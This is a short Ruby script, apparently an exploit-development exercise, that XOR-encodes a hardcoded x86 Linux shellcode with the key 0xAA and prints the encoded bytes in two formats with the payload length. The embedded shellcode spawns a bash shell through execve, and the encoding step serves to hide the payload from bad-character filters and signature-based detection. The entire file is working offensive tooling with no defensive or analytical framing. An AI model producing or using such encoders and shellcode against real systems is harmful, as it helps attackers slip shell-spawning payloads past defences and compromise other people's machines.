#!/usr/bin/env ruby
#xor oxAA with shellcode 

shellcode = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

encoded = ""
encoded2 = ""

puts "Encoded shellcode ..."

array = shellcode.unpack('C*')

array.each do |x|
	y = x ^ 0xAA
	encoded +='\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y
end

puts encoded
puts encoded2

puts "length is #{array.length}"
